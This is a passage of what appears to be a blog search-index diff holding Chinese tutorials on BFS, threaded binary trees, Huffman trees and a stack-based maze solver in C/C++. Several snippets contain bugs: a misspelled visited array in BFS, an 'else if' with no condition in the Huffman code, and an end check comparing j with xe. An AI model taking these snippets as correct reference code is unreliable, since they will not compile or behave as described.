+<p>从上面可以看出，在深度优先遍历中，每次沿着边“前进”一个顶点，相当于对图“层次化”，使图中的每个顶点都有一个层次号，只是深度优先遍历中这个层次号不如广度优先遍历中的层次号有意义</p>
+<h2 id="3、广度优先遍历（BFS）"><a href="#3、广度优先遍历（BFS）" class="headerlink" title="3、广度优先遍历（BFS）"></a>3、广度优先遍历（BFS）</h2><p>广度优先遍历的过程是首先访问初始点v，接着访问顶点v的所有未访问过的邻接点v1、v2、···、vt，然后按照v1、v2、···、vt的次序进行广度优先遍历，以此类推类推，直到图中所有和初始点v有路径相通的顶点都被访问过为止</p>
+<p>其代码实现（邻接表）为：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BFS</span><span class="params">(ADjGraph *G,<span class="keyword">int</span> v)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> w; <span class="comment">//用来存放刚从队列中取出的数据</span></span><br><span class="line">    ArcNode *p;</span><br><span class="line">    SqQuene *qu; <span class="comment">//建立一个队列</span></span><br><span class="line">    <span class="built_in">InitQuene</span>(qu); <span class="comment">//初始化队列</span></span><br><span class="line">    <span class="keyword">int</span> vistied[MAXV]=&#123;<span class="number">0</span>&#125;; <span class="comment">//将visited全部置为0</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%2d&quot;</span>,v); <span class="comment">//访问初始顶点v</span></span><br><span class="line">    visited[v]=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">enQuene</span>(qu,v); <span class="comment">//将v进队列</span></span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">QueneEmpty</span>(qu))&#123; <span class="comment">//队列不空时循环</span></span><br><span class="line">        <span class="built_in">deQuene</span>(qu,w); <span class="comment">//从队列中出一个顶点</span></span><br><span class="line">        p=G-&gt;adjlist[w].firstarc; <span class="comment">//p一开始指向这个顶点的第一个邻接点</span></span><br><span class="line">        <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)&#123; <span class="comment">//遍历这个顶点的所有邻接点</span></span><br><span class="line">            <span class="keyword">if</span>(visited[p-&gt;adjvex]==<span class="number">0</span>)&#123; <span class="comment">//如果没被访问过</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%2d&quot;</span>,p-&gt;adjvex); <span class="comment">//访问之</span></span><br><span class="line">                visited[p-&gt;adjvex]=<span class="number">1</span>; <span class="comment">//设置为已经访问</span></span><br><span class="line">                <span class="built_in">enQuene</span>(qu,p-&gt;adjvex); <span class="comment">//将其入栈</span></span><br><span class="line">            &#125;</span><br><span class="line">            p=p-&gt;nextarc;</span><br><span class="line">        &#125;            </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对于有向图或者无向图，在BFS算法中每个顶点都进队依次，因此执行的时间复杂度与DFS相同。当图采用邻接表来表示时，BFS的总时间复杂度是O(n+e)，当图采用邻接矩阵来表示，BFS的总时间复杂度为O(n²)</p>
+<p>从上面可以看出，在广度优先遍历中，每次沿着边“前进”一个顶点，也相当于对图进行了层次化，使图中的每个顶点都有一个层次号。由于在搜索中不同路径可能会有多条边到达，在广度优先遍历中取离出发点最短者，即层次号最低的哪个。也就是说，从顶点v出发进行广度优先遍历到顶点u，取v到u的一条最短路径（长度为l），如果v的层次号为l，则顶点u的层次号一定为l+1</p>
+]]></content>
+      <categories>
+        <category>算法</category>
+        <category>bug储藏室</category>
+      </categories>
+      <tags>
+        <tag>数据结构</tag>
+        <tag>算法</tag>
+        <tag>图</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>线索二叉树与哈夫曼树</title>
+    <url>/2021/05/02/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%8E%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91/</url>
+    <content><![CDATA[<h2 id="线索二叉树"><a href="#线索二叉树" class="headerlink" title="线索二叉树"></a>线索二叉树</h2><h3 id="（1）构造线索二叉树"><a href="#（1）构造线索二叉树" class="headerlink" title="（1）构造线索二叉树"></a>（1）构造线索二叉树</h3><p>对于一般的二叉树，如果其不全有左右孩子，则其指针域会有置空的现象，这时候实际上对结点的空间造成了一定的浪费。与此同时，我们在进行遍历二叉树的过程中，需要使用递归或者循环，我们不妨将二叉树的结点的空指针域利用起来，使其能够简化遍历二叉树的操作，这就是二叉树的线索化</p>
+<p>对于线索化哈夫曼树，我们需要使用两个变量<code>ltag</code>与<code>rtag</code>，用来指示此时指针域的指针指向的是遍历过程中的前驱和后继结点，还是二叉树中的左右孩子结点，所以基本数据结构的构建如下：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span> <span class="comment">//线索化二叉树结点</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="keyword">int</span> ltag,rtag; <span class="comment">//tag为0表示对应的指针指向的是孩子结点，为1表示指向的是遍历路径上的结点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> * <span class="title">lchild</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> * <span class="title">rchild</span>;</span></span><br><span class="line">&#125;TBTNode;</span><br></pre></td></tr></table></figure>
+
+<p>以中序线索二叉树为例建立线索二叉树，其代码实现如下：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">TBTNode * pre;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Thread</span><span class="params">(TBTNode *&amp;p)</span></span>&#123; <span class="comment">//将以p为根节点的普通二叉树进行线索化</span></span><br><span class="line">    <span class="keyword">if</span>(p!=<span class="literal">NULL</span>)&#123; <span class="comment">//p不为空则进行线索化</span></span><br><span class="line">        <span class="built_in">Thread</span>(p-&gt;lchild);	<span class="comment">//将左子树进行线索化</span></span><br><span class="line">        <span class="keyword">if</span>(p-&gt;lchild==<span class="literal">NULL</span>)&#123; <span class="comment">//如果左子树为空</span></span><br><span class="line">        	p-&gt;lchild=pre; <span class="comment">//让该结点的左指针域指向左子树进行线索化的过程中的最后一个结点</span></span><br><span class="line">            p-&gt;ltag=<span class="number">1</span>; <span class="comment">//将左指针作为线索指针</span></span><br><span class="line">    	&#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="comment">//左子树不为空</span></span><br><span class="line">            p-&gt;ltag=<span class="number">0</span>; <span class="comment">//将该结点的左指针设置为孩子指针</span></span><br><span class="line">        <span class="keyword">if</span>(pre-&gt;rchild==<span class="literal">NULL</span>)&#123; <span class="comment">//在将左子树进行线索化的过程中的最后一个结点的右指针域为空</span></span><br><span class="line">            pre-&gt;rchild=p; <span class="comment">//将这个最后一个结点的右指针指向当前结点</span></span><br><span class="line">        	pre-&gt;rtag=<span class="number">1</span>; <span class="comment">//将这个右指针设置为线索指针</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="comment">//否则</span></span><br><span class="line">            pre-&gt;rtag=<span class="number">0</span>; <span class="comment">//将这个右指针设置为孩子指针</span></span><br><span class="line">        pre=p; <span class="comment">//pre结点设置为当前的结点</span></span><br><span class="line">        <span class="built_in">Thread</span>(p-&gt;rchild); <span class="comment">//对右子树进行线索化</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">TBTNode *<span class="title">CreatThread</span><span class="params">(TBTNode *b)</span></span>&#123; <span class="comment">//建立带头结点的线索二叉树</span></span><br><span class="line">    TBTNode * root; <span class="comment">//设置一个头结点</span></span><br><span class="line">    root=(TBTNode *)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(TBTNode)); </span><br><span class="line">    root-&gt;ltag=<span class="number">0</span>; <span class="comment">//头节点的左指针设置为孩子指针</span></span><br><span class="line">    root-&gt;rtag=<span class="number">1</span>; <span class="comment">//右指针设置为线索指针</span></span><br><span class="line">    root-&gt;rchild=b; <span class="comment">//头节点的右孩子暂且设置为原来的根节点</span></span><br><span class="line">    <span class="keyword">if</span>(b==<span class="literal">NULL</span>) <span class="comment">//如果传进来的是一个空树</span></span><br><span class="line">        root-&gt;lchild=root; <span class="comment">//头结点的左孩子指向自己</span></span><br><span class="line">    <span class="keyword">else</span>&#123; <span class="comment">//不是空树</span></span><br><span class="line">        root-&gt;lchild=b; <span class="comment">//头结点的左孩子设置为根节点</span></span><br><span class="line">        pre=root; <span class="comment">//一开始的pre结点设置为头结点</span></span><br><span class="line">        <span class="built_in">Thread</span>(b); <span class="comment">//将树进行线索化</span></span><br><span class="line">        pre-&gt;rchild=root; <span class="comment">//线索化过程中遍历到的最后一个结点的右指针指回头结点</span></span><br><span class="line">        pre-&gt;rtag=<span class="number">1</span>; <span class="comment">//将这个最后一个结点的右指针设置为线索指针</span></span><br><span class="line">        root-&gt;rchild=pre; <span class="comment">//将头结点的右指针指向这个最后一个结点</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root; <span class="comment">//返回头结点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>线索二叉树的构造过程中，实际上逻辑顺序按照的是对应的遍历的顺序，只不过在其中引入了一个指针pre，用来标志遍历过程中该结点的前驱结点，不同的顺序所对应的函数内操作顺序也不同，比如：</p>
+<p><strong>中序遍历</strong>：先中序线索化（中序遍历）左子树，然后处理遍历的最近一个结点与父节点之间的关系，再将处理的最近一个结点设置为父节点，再中序线索化（中序遍历）右子树</p>
+<p><strong>先序遍历</strong>：先处理目前遍历过程中的最后一个结点与父节点的关系，将最近一个结点设置为父节点，然后先序线索化（先序遍历）左子树，再先序线索化（先序遍历）右子树</p>
+<p><strong>后序遍历</strong>：先后序线索化（后序遍历）左子树，再后序线索化（后序遍历）右子树，然后处理遍历完右子树之后的最近一个结点与父节点之间的关系，最后将父节点设置为最近结点</p>
+<h3 id="（2）利用线索二叉树简化遍历过程"><a href="#（2）利用线索二叉树简化遍历过程" class="headerlink" title="（2）利用线索二叉树简化遍历过程"></a>（2）利用线索二叉树简化遍历过程</h3><p>如下方代码所示（以中序遍历为例）：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ThInOrder</span><span class="params">(TBTNode *tb)</span></span>&#123;</span><br><span class="line">	TBTNode *p=tb-&gt;lchild;</span><br><span class="line">	<span class="keyword">while</span>(p!=tb)&#123;</span><br><span class="line">		<span class="keyword">while</span>(p-&gt;ltag==<span class="number">0</span>)</span><br><span class="line">            p=p-&gt;lchild; <span class="comment">//一直往左路找找到开始结点</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,p-&gt;data);</span><br><span class="line">        <span class="keyword">while</span>(p-&gt;rtag==<span class="number">1</span> &amp;&amp; p-&gt;rchild!=tb)&#123; <span class="comment">//如果右指针代表的是后继则一路往下访问其后继</span></span><br><span class="line">            p=p-&gt;rchild;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,p-&gt;data);</span><br><span class="line">        &#125;</span><br><span class="line">        p=p-&gt;rchild; <span class="comment">//如果右指针代表的是右孩子则对该右孩子使用同样的方式进行遍历</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以上，尽管时间复杂度仍然为O(n)，但是空间复杂度为O(1)，空间效率得到很大程度上的提高</p>
+<h3 id="（3）两个思考题"><a href="#（3）两个思考题" class="headerlink" title="（3）两个思考题"></a>（3）两个思考题</h3><p><strong>1、中序线索化二叉树是否能用于简化先序遍历？</strong></p>
+<p><strong>2、中序线索化二叉树是否能用于简化后序遍历？</strong></p>
+<h2 id="哈夫曼树"><a href="#哈夫曼树" class="headerlink" title="哈夫曼树"></a>哈夫曼树</h2><p>在许多应用中经常将树中的节点赋予一个有某种意义的数值，称此数值为该结点的权。从根节点到该结点之间的路径长度与该结点上权的成绩称为结点的带权路径长度（简称WPL），树中所有叶子节点的带权路径长度之和称为该树的带权路径长度，通常记为：<br>$$<br>\sum_{i=1}^{n_0}{w_il_i}<br>$$<br>其中<code>n0</code>表示叶子结点的个数，<code>wi</code>和<code>li</code>分别表示第<code>i</code>个叶子结点的权值和根到它之间的路径长度，即从根节点到该叶子结点的路径上经过的分支数</p>
+<p>在n0个带权叶子结点构成的所有二叉树中，带权路径长度WPL最小的二叉树称为哈夫曼树或最优二叉树</p>
+<p>构造哈夫曼树的算法为：</p>
+<p><strong>（1）</strong>根据给定的n0个权值（w1、w2、···、wn0），对应结点构成n0棵二叉树的森林F=(T1、T2、···、Tn0)，其中每棵二叉树中都有一个带权值为wi的根节点，其左右子树均为空</p>
+<p><strong>（2）</strong>在森林F中选取两棵结点的权值最小的子树分别作为左右子树构造一棵新的二叉树并且置新的二叉树的根节点的权值为其左右子树上根的权值之和</p>
+<p><strong>（3）</strong>在森林F中用新得到的二叉树代替这两棵树</p>
+<p><strong>（4）</strong>重复（2）（3）直到森林中只含一棵树，这棵树就是哈夫曼树</p>
+<p>代码实现如下：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> data;</span><br><span class="line">    <span class="keyword">double</span> weight;</span><br><span class="line">    <span class="keyword">int</span> parent;</span><br><span class="line">    <span class="keyword">int</span> lchild;</span><br><span class="line">    <span class="keyword">int</span> rchild;</span><br><span class="line">&#125;HTNode;</span><br></pre></td></tr></table></figure>
+
+<p>用<code>ht[]</code>数组存放哈夫曼树，对于具有n个叶子结点的哈夫曼树，总共有2n-1个结点，其算法思路是，n个叶子结点（存放在<code>ht[0]</code>~<code>ht[n-1]</code>中）只有<code>data</code>和<code>weight</code>域值，先将2n-1个结点的<code>parent</code>、<code>lchild</code>、<code>rchild</code>域置为初值-1，然后处理每个非叶子结点<code>ht[i]</code>（存放在<code>ht[n]</code>~<code>ht[2n-2]</code>中）：从<code>ht[0]</code>~<code>ht[i-2]</code>中找出根节点（其<code>parent</code>域为-1）以及最小的两个结点<code>ht[lnode]</code>和<code>ht[ronde]</code>，将它们作为<code>ht[i]</code>的左右子树，将<code>ht[lnode]</code>和<code>ht[ronde]</code>的双亲结点置为<code>ht[i]</code>，并且<code>ht[i].weight</code>=<code>ht[lnode].weight</code>+<code>ht[rnode].weight</code>。如此循环往复直到n-1个非叶子节点处理完毕</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateHT</span><span class="params">(HTNode ht[],<span class="keyword">int</span> n)</span></span>&#123; <span class="comment">//构造哈夫曼树</span></span><br><span class="line">    <span class="keyword">int</span> i,k,lnode,rnode;</span><br><span class="line">    <span class="keyword">double</span> min1,min2;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>*n<span class="number">-1</span>;i++)</span><br><span class="line">        ht[i].parent=ht[i].lchild=ht[i].rchild=<span class="number">-1</span>; <span class="comment">//先初始化</span></span><br><span class="line">    <span class="keyword">for</span>(i=n;i&lt;=<span class="number">2</span>*n<span class="number">-2</span>;i++)&#123;</span><br><span class="line">        min1=min2=<span class="number">32767</span>;</span><br><span class="line">        lnode=rnode=<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;=i<span class="number">-1</span>;k++)  <span class="comment">//在ht[0]~ht[i-1]中找到权值最小的两个结点</span></span><br><span class="line">            <span class="keyword">if</span>(ht[k].parent==<span class="number">-1</span>)&#123; <span class="comment">//只考虑无父结点的结点</span></span><br><span class="line">                <span class="keyword">if</span>(ht[k].weight&lt;min1)&#123;</span><br><span class="line">                    min2=min1;rnode=lnode;</span><br><span class="line">                    min1=ht[k].weight;lnode=k;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>&#123;</span><br><span class="line">                    min2=ht[k].weight;rnode=k;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ht[i].weight=ht[lnode].weight+ht[rnode].weight;</span><br><span class="line">        ht[i].lchild=lnode;ht[i].rchild=rnode; <span class="comment">//将ht[i]作为刚刚找到的两个权值最小的无父节点的结点的父结点</span></span><br><span class="line">        ht[lnode].parent=ht[rnode].parent=i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>算法</category>
+        <category>bug储藏室</category>
+      </categories>
+      <tags>
+        <tag>数据结构</tag>
+        <tag>算法</tag>
+        <tag>树</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>迷宫问题</title>
+    <url>/2021/05/01/%E8%BF%B7%E5%AE%AB%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<p>迷宫问题是数据结构以及算法领域之中的一个非常经典的问题</p>
+<p><strong>该问题的描述为：给出一个m*n的二维整形数组作为迷宫，其中边框的值为<code>1</code>，迷宫中可以走的路径为<code>0</code>，障碍物为<code>1</code>，另外使用坐标来标记起点和终点的位置（如下图所示便是一个8*8的迷宫）</strong></p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> mg[<span class="number">10</span>][<span class="number">10</span>]=&#123;</span><br><span class="line">    &#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以采用多种思路来解决该问题：</p>
+<h2 id="1、使用栈来进行深度优先搜索找到一条路径"><a href="#1、使用栈来进行深度优先搜索找到一条路径" class="headerlink" title="1、使用栈来进行深度优先搜索找到一条路径"></a>1、使用栈来进行深度优先搜索找到一条路径</h2><h3 id="（1）存放迷宫的数据结构"><a href="#（1）存放迷宫的数据结构" class="headerlink" title="（1）存放迷宫的数据结构"></a>（1）存放迷宫的数据结构</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">//该方块的行号</span></span><br><span class="line">    <span class="keyword">int</span> j; <span class="comment">//该方块的列号</span></span><br><span class="line">    <span class="keyword">int</span> di; <span class="comment">//对于该方块来说的下一个可走方块的方位号（0-&gt;上1-&gt;右2-&gt;下3-&gt;左）</span></span><br><span class="line">&#125;box;</span><br><span class="line"><span class="keyword">typedef</span> box ElemType;</span><br></pre></td></tr></table></figure>
+
+<p>首先定义一个结构体代表迷宫中的某个格子，其中包括了该格子的行号、列号以及在研究问题的过程中下一个需要研究的方位代号</p>
+<p>因为用栈来进行解决问题，所以还需要定义一个存放格子的栈：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    box data[MAX_STACK];</span><br><span class="line">    <span class="keyword">int</span> top; <span class="comment">//栈顶</span></span><br><span class="line">&#125;SqStack;</span><br></pre></td></tr></table></figure>
+
+<h3 id="（2）函数主体"><a href="#（2）函数主体" class="headerlink" title="（2）函数主体"></a>（2）函数主体</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maze1</span><span class="params">(<span class="keyword">int</span> xi,<span class="keyword">int</span> yi,<span class="keyword">int</span> xe,<span class="keyword">int</span> ye)</span></span>&#123;  <span class="comment">//使用栈进行深度优先搜索找迷宫的一条路径，(xi,yi)为起点，(xe,ye)为终点</span></span><br><span class="line">    box path[MAX_STACK];</span><br><span class="line">    box e;</span><br><span class="line">    <span class="keyword">int</span> i,j,di,i1,j1,k;</span><br><span class="line">    <span class="keyword">int</span> find;</span><br><span class="line">    SqStack *st; <span class="comment">//定义栈</span></span><br><span class="line">    <span class="built_in">Stack_Ini</span>(st); <span class="comment">//初始化栈</span></span><br><span class="line">    e.i=xi;</span><br><span class="line">    e.j=yi;</span><br><span class="line">    e.di=<span class="number">-1</span>;</span><br><span class="line">    <span class="comment">/*首先建立起点格子*/</span></span><br><span class="line">    <span class="built_in">Stack_Push</span>(st,e); <span class="comment">//将起点格子入栈</span></span><br><span class="line">    mg[xi][yi]=<span class="number">-1</span>; <span class="comment">//起点是第一个走过的方块</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">Stack_Empty</span>(st)!=<span class="number">1</span>)&#123; <span class="comment">//栈不为空</span></span><br><span class="line">        <span class="built_in">Stack_GetTop</span>(st,e); <span class="comment">//将栈顶元素取出</span></span><br><span class="line">        i=e.i; <span class="comment">//将i设置为栈顶格子的x坐标</span></span><br><span class="line">        j=e.j; <span class="comment">//将j设置为栈顶格子的y坐标</span></span><br><span class="line">        di=e.di; <span class="comment">//di设置为栈顶格子的当前未走过的方向</span></span><br><span class="line">        <span class="keyword">if</span>(i==xe &amp;&amp; j==xe)&#123; <span class="comment">//找到了出口</span></span><br><span class="line">            <span class="built_in">output</span>(); <span class="comment">//将路径输出</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;  </span><br><span class="line">        find=<span class="number">0</span>; <span class="comment">//将找到设置为负</span></span><br><span class="line">        <span class="keyword">while</span>(di&lt;<span class="number">4</span> &amp;&amp; !find)&#123; <span class="comment">//寻找目前格子的相邻可走方块</span></span><br><span class="line">            di++;</span><br><span class="line">            <span class="built_in"><span class="keyword">switch</span></span>(di)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:i1=i<span class="number">-1</span>;j1=j;<span class="keyword">break</span>; <span class="comment">//向上走</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:i1=i;j1=j+<span class="number">1</span>;<span class="keyword">break</span>; <span class="comment">//向右走</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:i1=i+<span class="number">1</span>;j1=j;<span class="keyword">break</span>; <span class="comment">//向下走</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:i1=i;j1=j<span class="number">-1</span>;<span class="keyword">break</span>; <span class="comment">//向左走</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(mg[i1][j1]==<span class="number">0</span>) <span class="comment">//如果找到另一个可走方块</span></span><br><span class="line">                find=<span class="number">1</span>; <span class="comment">//找到设置为1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(find)&#123;</span><br><span class="line">            st-&gt;data[st-&gt;top].di=di; <span class="comment">//将目前的方向设置为栈顶元素的已经走过的方向</span></span><br><span class="line">            e.i=i1;</span><br><span class="line">            e.j=j1;</span><br><span class="line">            e.di=<span class="number">-1</span>; <span class="comment">//新的结点的已经走过的方向指标，初始化为-1，即四个方向都还没涉足</span></span><br><span class="line">            <span class="built_in">Stack_Push</span>(st,e); <span class="comment">//将新的结点入栈</span></span><br><span class="line">            mg[i1][j1]=<span class="number">-1</span>; <span class="comment">//将迷宫中的该结点设置为走过</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123; <span class="comment">//走到死胡同了</span></span><br><span class="line">            <span class="built_in">Stack_Pop</span>(st,e); <span class="comment">//出栈</span></span><br><span class="line">            mg[e.i][e.j]=<span class="number">0</span>; <span class="comment">//重置当前格子为没走过</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>该算法可以这么理解，按照一定的顺序（如上右下左）对每个格子进行检查，当某个格子的某个方向可以前进，就往那个方向前进，并且用一个画笔将该格子涂上颜色，如果说来到了死胡同（剩下还没有经历过的方向要不是已经上了颜色（走过了），要不就是障碍物），那么就把当前格子的颜色擦掉，退一格，研究其前一个格子的下一个方向，如果走到了终点，则将迷宫打印出来</p>
+<p>打印迷宫可以使用一个output函数：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">output</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">10</span>;j++)&#123;</span><br><span class="line">            <span class="built_in"><span class="keyword">switch</span></span>(mg[i][j])&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:<span class="built_in">printf</span>(<span class="string">&quot;■&quot;</span>);<span class="keyword">break</span>;<span class="comment">//障碍物</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:<span class="built_in">printf</span>(<span class="string">&quot;  &quot;</span>);<span class="keyword">break</span>;<span class="comment">//空地</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">-1</span>:<span class="built_in">printf</span>(<span class="string">&quot;●&quot;</span>);<span class="keyword">break</span>;<span class="comment">//路径</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为迷宫在此时是以全局变量的形式进行保存，所以output函数不需要传参</p>
+<h3 id="（3）有关栈的基础函数"><a href="#（3）有关栈的基础函数" class="headerlink" title="（3）有关栈的基础函数"></a>（3）有关栈的基础函数</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stack_Ini</span><span class="params">(SqStack *&amp;s)</span></span>&#123; <span class="comment">//初始化栈</span></span><br><span class="line">    s=(SqStack*)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(SqStack));</span><br><span class="line">    s-&gt;top=<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stack_Destory</span><span class="params">(SqStack *&amp;s)</span></span>&#123; <span class="comment">//销栈</span></span><br><span class="line">    <span class="built_in">free</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Stack_Empty</span><span class="params">(SqStack *&amp;s)</span></span>&#123; <span class="comment">//判断栈是否为空</span></span><br><span class="line">    <span class="keyword">return</span> (s-&gt;top==<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stack_Push</span><span class="params">(SqStack *&amp;s,ElemType e)</span></span>&#123; <span class="comment">//进栈</span></span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top&gt;=MAX_STACK<span class="number">-1</span>) <span class="comment">//栈满</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    s-&gt;top++;</span><br><span class="line">    s-&gt;data[s-&gt;top]=e;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stack_Pop</span><span class="params">(SqStack *&amp;s,ElemType &amp;e)</span></span>&#123; <span 